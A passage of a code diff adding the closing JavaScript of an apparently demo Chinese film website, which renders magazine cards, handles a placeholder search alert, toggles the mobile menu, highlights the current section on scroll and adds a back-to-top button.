+      h+='<article class="lead" style="background:'+m.bg+'"><div class="in"><span class="cat">'+m.cat+'</span><h3>'+m.t+'</h3><p>'+m.p+'</p></div></article>';
+    }else{
+      h+='<a class="mn" href="#"><div class="th" style="background:'+m.bg+'">'+m.th+'</div><div><span class="pill">'+m.c+'</span><h4>'+m.t+'</h4><small>'+m.n+'</small></div></a>';
+    }
+  }
+  document.getElementById("mag").innerHTML=h;
+}
+function doSearch(){
+  var q=document.getElementById("q").value.trim();
+  if(q) alert("演示站点：搜索 「"+q+"」，内页链接以 # 占位。");
+}
+
+document.addEventListener("DOMContentLoaded",function(){
+  renderFilms();renderGenres();renderQuotes();renderRank();renderReviews();
+  document.getElementById("yr").textContent=new Date().getFullYear();
+
+  var mb=document.getElementById("mb"), nav=document.getElementById("nav");
+  mb.addEventListener("click",function(){
+    nav.classList.toggle("open");
+    var o=nav.classList.contains("open");
+    mb.textContent=o?"✕":"☰";
+    mb.setAttribute("aria-expanded",o?"true":"false");
+  });
+  var as=nav.querySelectorAll("a");
+  for(var a=0;a<as.length;a++){
+    as[a].addEventListener("click",function(){nav.classList.remove("open");mb.textContent="☰";mb.setAttribute("aria-expanded","false");});
+  }
+
+  var secs=document.querySelectorAll("section[id]"), items=document.querySelectorAll(".nav a"), tt=document.getElementById("top");
+  function onScroll(){
+    var pos=window.scrollY+170, cur="";
+    for(var s=0;s<secs.length;s++){ if(secs[s].offsetTop<=pos) cur=secs[s].id; }
+    for(var n=0;n<items.length;n++){ items[n].classList.toggle("on", items[n].getAttribute("href")==="#"+cur); }
+    tt.classList.toggle("show", window.scrollY>700);
+  }
+  window.addEventListener("scroll",onScroll,{passive:true});
+  onScroll();
+  tt.addEventListener("click",function(){window.scrollTo({top:0,behavior:"smooth"});});
+  document.getElementById("q").addEventListener("keydown",function(e){if(e.key==="Enter") doSearch();});
+});
+</script>
+</body>
+</html>
